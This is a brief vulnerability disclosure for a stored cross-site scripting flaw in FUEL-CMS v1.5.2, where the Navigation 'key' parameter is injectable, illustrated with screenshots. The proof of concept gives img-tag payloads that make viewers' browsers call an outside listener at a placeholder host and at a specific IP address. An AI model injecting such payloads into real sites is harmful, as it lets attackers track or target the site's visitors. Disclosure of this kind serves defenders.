# Stored XSS vulnerability in FUEL-CMS v1.5.2 of the key param

**vender**:

- [daylightstudio/FUEL-CMS: A CodeIgniter Content Management System](https://github.com/daylightstudio/FUEL-CMS)

**SoftLink**:

- [Release 1.5.2 · daylightstudio/FUEL-CMS](https://github.com/daylightstudio/FUEL-CMS/releases/tag/1.5.2)

**Vulnerable param**

- Key in Navigation

**Version**

- v 1.5.2

### POC 

```
<img src="http://vps:2333" alt="dune">
```

```
<img src="http://189.1.245.32:2333" alt="dune">
```

the param key

![image-20250818214431833](https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202508182144976.png)





![image-20250818213944314](https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202508182139444.png)





![image-20250818214445461](https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202508182144551.png)

